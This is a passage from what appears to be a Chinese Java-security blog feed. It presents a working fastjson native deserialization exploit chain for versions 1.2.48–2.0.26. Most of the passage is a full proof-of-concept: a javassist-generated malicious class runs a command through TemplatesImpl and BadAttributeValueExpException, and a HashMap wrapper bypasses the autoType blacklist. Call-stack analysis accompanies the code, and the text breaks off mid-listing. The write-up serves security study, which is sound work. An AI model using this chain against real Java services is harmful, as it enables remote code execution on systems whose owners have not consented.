class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(map, <span class="hljs-string">&quot;lingx5&quot;</span>);<br>        HashMap&lt;Object, Object&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        hashMap.put(tiedMapEntry, <span class="hljs-string">&quot;lingx5&quot;</span>);<br>        <span class="hljs-comment">// 反射给map的factory字段赋值为chainedTransformer</span><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">factory</span> <span class="hljs-operator">=</span> map.getClass().getDeclaredField(<span class="hljs-string">&quot;factory&quot;</span>);<br>        factory.setAccessible(<span class="hljs-literal">true</span>);<br>        factory.set(map, chainedTransformer);<br>        map.remove(<span class="hljs-string">&quot;lingx5&quot;</span>);<br><br><br>        <span class="hljs-comment">// 序列化</span><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>        oos.writeObject(hashMap);<br>        <span class="hljs-comment">// 反序列化</span><br>        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">bais</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(baos.toByteArray());<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(bais);<br>        ois.readObject();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>其实学习完之前的链条，这个就很容易理解了</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250406205751789.png" alt="image-20250406205751789"></p>]]></content>
    
    
    <categories>
      
      <category>java安全</category>
      
      <category>Apache-CC链</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java安全</tag>
      
      <tag>Apache-CC链</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>fastjson 原生反序列化链</title>
    <link href="/2025/04/04/fastjson-%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/"/>
    <url>/2025/04/04/fastjson-%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/</url>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><h1 id="fastjson-原生链"><a href="#fastjson-原生链" class="headerlink" title="fastjson 原生链"></a>fastjson 原生链</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>说起 fastjson 反序列化，大部分的利用都是从 @type 把 json 串解析为 java 对象，在构造方法和 setter、getter 方法中，做一些文件或者命令执行的操作。当然，在 fastjson 的依赖包中，也存在着像 CC 链 一样的利用的方式，从 readOject 出发，达到命令执行的效果</p><p>在 fasjton 中 可以序列化的类有</p><ul><li>com.alibaba.fastjson.JSONException</li><li>com.alibaba.fastjson.JSONPathException</li><li>com.alibaba.fastjson.JSONArray</li><li>com.alibaba.fastjson.JSONObject</li></ul><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250403095827267.png" alt="image-20250403095827267"></p><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><p>适用版本 1.2.48 - 2.0.26</p><p>依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- 添加 javassist 依赖 --&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>       <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.javassist<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>       <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>javassist<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>       <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.28.0-GA<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>   <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>     <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.alibaba<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>     <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>fastjson<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>     <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.2.83<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>   <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.lingx5.fastjson2;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSONArray;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FastjsonSer</span> &#123;<br>    <span class="hljs-comment">// 利用 javassist 生成恶意类字节码</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] getTemplates() <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">ctClass</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">evil</span> <span class="hljs-operator">=</span> ctClass.makeClass(<span class="hljs-string">&quot;Evil&quot;</span>);<br>        evil.setSuperclass(ctClass.get(<span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>));<br>        evil.makeClassInitializer().insertBefore(<span class="hljs-string">&quot;Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);<br>        <span class="hljs-keyword">return</span> evil.toBytecode();<br>    &#125;<br>    <span class="hljs-comment">// 封装 setFieldValue 方法，用来反射设置字段值</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj,String name, Object value)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(name);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">byte</span>[] code = getTemplates();<br><br>        <span class="hljs-comment">//装载Template</span><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">template</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        setFieldValue(template, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][] &#123;code&#125;);<br>        setFieldValue(template, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;Evil&quot;</span>);<br><br><br>        <span class="hljs-type">JSONArray</span> <span class="hljs-variable">jsonArray</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONArray</span>();<br>        jsonArray.add(template);<br><br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">badAttributeValueExpException</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-literal">null</span>);<br>        setFieldValue(badAttributeValueExpException, <span class="hljs-string">&quot;val&quot;</span>, jsonArray);<br><br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">hashMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        hashMap.put(template, badAttributeValueExpException);<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">barr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(barr);<br>        oos.writeObject(hashMap);<br>        oos.close();<br><br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(barr.toByteArray()));<br>        <span class="hljs-keyword">try</span>&#123;<br>            <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> ois.readObject();<br>        &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;<br>        &#125;<br>        <span class="hljs-keyword">while</span>(<span class="hljs-literal">true</span>)&#123;&#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>当然 你也可以不使用 javassist 动态生成类的字节码，把编译好的恶意 class 文件的二进制数组，显示赋值给 <code>_bytecodes</code> 变量即可</p></blockquote><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>先解释一下这个 POC</p><blockquote><p>getTemplates 方法 ，是使用 javassist 生成了一个继承 AbstractTranslet 的恶意类名字是 Evil，在静态代码块里放置了执行计算器的恶意代码 方法返回恶意类的字节码</p><p>在 main 方法中 创建了 TemplatesImpl 实例，利用它类加载的能力来实例化恶意类，从而执行代码。</p><p>因为 JSONArray 实现了 serialize 接口，是可以实现序列化和反序列化的，找到了 BadAttributeValueExpException 的 readObject()方法，执行 JSON 的 toString()，调用任意类的 getter 方法，这里选择的是 TemplateImpl 类，因为他的getter方法具有类加载和初始化的能力</p></blockquote><p>我们可以利用 arthas 把这个类从内存里 dump 下来看一下，这是工具的官方教程：<a href="https://arthas.aliyun.com/doc/quick-start.html">快速入门 | arthas</a></p><p>为了可以使用工具注入这个线程，我们在代码的尾部加上 <code>while(true)&#123;&#125;</code> 循环，让这个代码运行不终止</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250403184705622.png" alt="image-20250403184705622"></p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">jad Evil<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250403132312975.png" alt="image-20250403132312975"></p><p>主要调用链</p><figure class="highlight leaf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs leaf">javax.management.BadAttributeValueExpException<span class="hljs-punctuation">#</span><span class="hljs-keyword">readObject</span><br>com.alibaba.fastjson.JSON<span class="hljs-punctuation">#</span><span class="hljs-keyword">toString</span><span class="hljs-params">()</span><br>com.alibaba.fastjson.JSON<span class="hljs-punctuation">#</span><span class="hljs-keyword">toJSONString</span><span class="hljs-params">()</span><br>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.getOutputProperties<br></code></pre></td></tr></table></figure><p>这里传入的是 JSONArray 对象，但是执行的是 JSON#toString() ，是因为 JSONArray 没有重写 toString() 方法，所以会执行父类的方法。我们都知道 JSON#toJSONString() 就是把 java 对象序列化为 json 串的方法，会自动调用 get 方法，后续的调用就是 在 fastjson1.2.24 的过程一样了</p><h2 id="执行结果"><a href="#执行结果" class="headerlink" title="执行结果"></a>执行结果</h2><p>毫无疑问肯定是可以实现代码执行的</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250403133224108.png" alt="image-20250403133224108"></p><h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p>这里有几个问题油然而生</p><ol><li>JSON 的 toString() 是怎么样去执行 getter 方法的？</li><li>入口是 BadAttributeValueExpException#readOject 方法，为什么还要用 HashMap 做一层封装呢？</li></ol><p>我们先来看问题一</p><h3 id="getter-方法的执行"><a href="#getter-方法的执行" class="headerlink" title="getter 方法的执行"></a>getter 方法的执行</h3><p>实际上我们在 idea 里面调试是调试不到的，在调用栈中看到 <code>com.alibaba.fastjson.serializer.ASMSerializer_1_TemplatesImpl.write(Unknown Source:-1)</code> 这其实就表示这个类是由运行时动态生成的，并无显示调用</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250403184114125.png" alt="image-20250403184114125"></p><p>调用链</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs stylus">at com<span class="hljs-selector-class">.sun</span><span class="hljs-selector-class">.org</span><span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.xalan</span><span class="hljs-selector-class">.internal</span><span class="hljs-selector-class">.xsltc</span><span class="hljs-selector-class">.trax</span><span class="hljs-selector-class">.TemplatesImpl</span><span class="hljs-selector-class">.getOutputProperties</span>(TemplatesImpl<span class="hljs-selector-class">.java</span>:<span class="hljs-number">605</span>)<br>at com<span class="hljs-selector-class">.alibaba</span><span class="hljs-selector-class">.fastjson</span><span class="hljs-selector-class">.serializer</span><span class="hljs-selector-class">.ASMSerializer_1_TemplatesImpl</span><span class="hljs-selector-class">.write</span>(Unknown Source:-<span class="hljs-number">1</span>)<br>at com<span class="hljs-selector-class">.alibaba</span><span class="hljs-selector-class">.fastjson</span><span class="hljs-selector-class">.serializer</span><span class="hljs-selector-class">.ListSerializer</span><span class="hljs-selector-class">.write</span>(ListSerializer<span class="hljs-selector-class">.java</span>:<span class="hljs-number">135</span>)<br>at com<span class="hljs-selector-class">.alibaba</span><span class="hljs-selector-class">.fastjson</span><span class="hljs-selector-class">.serializer</span><span class="hljs-selector-class">.JSONSerializer</span><span class="hljs-selector-class">.write</span>(JSONSerializer<span class="hljs-selector-class">.java</span>:<span class="hljs-number">312</span>)<br>at com<span class="hljs-selector-class">.alibaba</span><span class="hljs-selector-class">.fastjson</span><span class="hljs-selector-class">.JSON</span><span class="hljs-selector-class">.toJSONString</span>(JSON<span class="hljs-selector-class">.java</span>:<span class="hljs-number">1077</span>)<br>at com<span class="hljs-selector-class">.alibaba</span><span class="hljs-selector-class">.fastjson</span><span class="hljs-selector-class">.JSON</span><span class="hljs-selector-class">.toString</span>(JSON<span class="hljs-selector-class">.java</span>:<span class="hljs-number">1071</span>)<br>at javax<span class="hljs-selector-class">.management</span><span class="hljs-selector-class">.BadAttributeValueExpException</span><span class="hljs-selector-class">.readObject</span>(BadAttributeValueExpException<span class="hljs-selector-class">.java</span>:<span class="hljs-number">86</span>)<br></code></pre></td></tr></table></figure><p>因为 fastjson 在这一部分使用了 asm 技术来提升性能，我们只能利用一些 heapdump 工具来分析</p><p>而 <code>ASMSerializer_1_TemplatesImpl</code> 这个类很长，看到调用的其实是他的 write 方法，我们 dump 一个 write 方法分析就好</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">jad com<span class="hljs-selector-class">.alibaba</span><span class="hljs-selector-class">.fastjson</span><span class="hljs-selector-class">.serializer</span><span class="hljs-selector-class">.ASMSerializer_1_TemplatesImpl</span> write<br></code></pre></td></tr></table></figure><p>dump 的 ASMSerializer_1_TemplatesImpl 类 write 方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">write</span><span class="hljs-params">(JSONSerializer jSONSerializer, Object object, Object object2, Type type, <span class="hljs-type">int</span> n)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>    ObjectSerializer objectSerializer;<br>    <span class="hljs-keyword">if</span> (object == <span class="hljs-literal">null</span>) &#123;<br>        jSONSerializer.writeNull();<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-type">SerializeWriter</span> <span class="hljs-variable">serializeWriter</span> <span class="hljs-operator">=</span> jSONSerializer.out;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">this</span>.writeDirect(jSONSerializer)) &#123;<br>        <span class="hljs-built_in">this</span>.writeNormal(jSONSerializer, object, object2, type, n);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (serializeWriter.isEnabled(<span class="hljs-number">32768</span>)) &#123;<br>        <span class="hljs-built_in">this</span>.writeDirectNonContext(jSONSerializer, object, object2, type, n);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templatesImpl</span> <span class="hljs-operator">=</span> (TemplatesImpl)object;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.writeReference(jSONSerializer, object, n)) &#123;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (serializeWriter.isEnabled(<span class="hljs-number">0x200000</span>)) &#123;<br>        <span class="hljs-built_in">this</span>.writeAsArray(jSONSerializer, object, object2, type, n);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-type">SerialContext</span> <span class="hljs-variable">serialContext</span> <span class="hljs-operator">=</span> jSONSerializer.getContext();<br>    jSONSerializer.setContext(serialContext, object, object2, <span class="hljs-number">0</span>);<br>    <span class="hljs-type">int</span> <span class="hljs-variable">n2</span> <span class="hljs-operator">=</span> <span class="hljs-number">123</span>;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">string</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;outputProperties&quot;</span>;<br>    <span class="hljs-comment">// 调用 getOutputProperties() 方法</span><br>    <span class="hljs-type">Object</span> <span class="hljs-variable">object3</span> <span class="hljs-operator">=</span> templatesImpl.getOutputProperties();<br>    <span class="hljs-keyword">if</span> (object3 == <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-keyword">if</span> (serializeWriter.isEnabled(<span class="hljs-number">964</span>)) &#123;<br>            serializeWriter.write(n2);<br>            serializeWriter.writeFieldNameDirect(string);<br>            serializeWriter.writeNull(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>            n2 = <span class="hljs-number">44</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        serializeWriter.write(n2);<br>        serializeWriter.writeFieldNameDirect(string);<br>        <span class="hljs-keyword">if</span> (object3.getClass() == Properties.class) &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.outputProperties_asm_ser_ == <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-built_in">this</span>.outputProperties_asm_ser_ = jSONSerializer.getObjectWriter(Properties.class);<br>            &#125;<br>            <span class="hljs-keyword">if</span> ((objectSerializer = <span class="hljs-built_in">this</span>.outputProperties_asm_ser_) <span class="hljs-keyword">instanceof</span> JavaBeanSerializer) &#123;<br>                ((JavaBeanSerializer)objectSerializer).write(jSONSerializer, object3, string, <span class="hljs-built_in">this</span>.outputProperties_asm_fieldType, <span class="hljs-number">0</span>);<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                objectSerializer.write(jSONSerializer, object3, string, <span class="hljs-built_in">this</span>.outputProperties_asm_fieldType, <span class="hljs-number">0</span>);<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            jSONSerializer.writeWithFieldName(object3, string, <span class="hljs-built_in">this</span>.outputProperties_asm_fieldType, <span class="hljs-number">0</span>);<br>        &#125;<br>        n2 = <span class="hljs-number">44</span>;<br>    &#125;<br>    string = <span class="hljs-string">&quot;stylesheetDOM&quot;</span>;<br>    <span class="hljs-keyword">if</span> (!serializeWriter.isEnabled(<span class="hljs-number">0x2000000</span>)) &#123;<br>        <span class="hljs-comment">// 调用getStylesheetDOM() 方法</span><br>        object3 = templatesImpl.getStylesheetDOM();<br>        <span class="hljs-keyword">if</span> (object3 == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">if</span> (serializeWriter.isEnabled(<span class="hljs-number">964</span>)) &#123;<br>                serializeWriter.write(n2);<br>                serializeWriter.writeFieldNameDirect(string);<br>                serializeWriter.writeNull(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>                n2 = <span class="hljs-number">44</span>;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            serializeWriter.write(n2);<br>            serializeWriter.writeFieldNameDirect(string);<br>            <span class="hljs-keyword">if</span> (object3.getClass() == DOM.class) &#123;<br>                <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.stylesheetDOM_asm_ser_ == <span class="hljs-literal">null</span>) &#123;<br>                    <span class="hljs-built_in">this</span>.stylesheetDOM_asm_ser_ = jSONSerializer.getObjectWriter(DOM.class);<br>                &#125;<br>                <span class="hljs-keyword">if</span> ((objectSerializer = <span class="hljs-built_in">this</span>.stylesheetDOM_asm_ser_) <span class="hljs-keyword">instanceof</span> JavaBeanSerializer) &#123;<br>                    ((JavaBeanSerializer)objectSerializer).write(jSONSerializer, object3, string, <span class="hljs-built_in">this</span>.stylesheetDOM_asm_fieldType, <span class="hljs-number">0</span>);<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    objectSerializer.write(jSONSerializer, object3, string, <span class="hljs-built_in">this</span>.stylesheetDOM_asm_fieldType, <span class="hljs-number">0</span>);<br>                &#125;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                jSONSerializer.writeWithFieldName(object3, string, <span class="hljs-built_in">this</span>.stylesheetDOM_asm_fieldType, <span class="hljs-number">0</span>);<br>            &#125;<br>            n2 = <span class="hljs-number">44</span>;<br>        &#125;<br>    &#125;<br>    string = <span class="hljs-string">&quot;transletIndex&quot;</span>;<br>    <span class="hljs-comment">// 调用getTransletIndex() 方法</span><br>    <span class="hljs-type">int</span> <span class="hljs-variable">n3</span> <span class="hljs-operator">=</span> templatesImpl.getTransletIndex();<br>    serializeWriter.writeFieldValue((<span class="hljs-type">char</span>)n2, string, n3);<br>    n2 = <span class="hljs-number">44</span>;<br>    <span class="hljs-keyword">if</span> (n2 == <span class="hljs-number">123</span>) &#123;<br>        serializeWriter.write(<span class="hljs-number">123</span>);<br>    &#125;<br>    serializeWriter.write(<span class="hljs-number">125</span>);<br>    jSONSerializer.setContext(serialContext);<br>&#125;<br></code></pre></td></tr></table></figure><p>可以发现，他会遍历调用所有实现了 getter 方法属性的 getter 方法 分别在 28 、56、84 行，我做了注释</p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250403190208919.png" alt="image-20250403190208919" style="zoom:67%;" /><p>而他调用 getOutputProperties() 方法时，就会触发我们的恶意类加载进 jvm，从而实现恶意代码执行</p><h3 id="HashMap-封装的巧用"><a href="#HashMap-封装的巧用" class="headerlink" title="HashMap 封装的巧用"></a>HashMap 封装的巧用</h3><p>其实用 HashMap 封装，是使用了一定的绕过技巧。我们都知道 fastjson 在很早就把 TemplateImpl 这个类给加进 checkAutoType 的黑名单了 直接使用 <code>BadAttributeValueExpException#readOject 方法</code> 进行反序列化，会被拦截</p><p>我们可以测试一下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.lingx5.fastjson2;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSONArray;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> java.io.*;<br><span 